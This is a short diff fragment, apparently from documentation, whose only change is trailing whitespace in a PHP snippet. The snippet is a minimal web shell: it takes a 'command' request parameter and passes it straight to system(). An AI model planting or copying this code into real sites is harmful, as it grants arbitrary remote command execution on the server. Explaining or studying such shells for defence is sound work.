@@ -3,7 +3,7 @@
 Refer to below.
 
 ```PHP
-<?php 
+<?php
 if (isset($_REQUEST['command'])) {
   $command = $_REQUEST['command'];
   system($command);
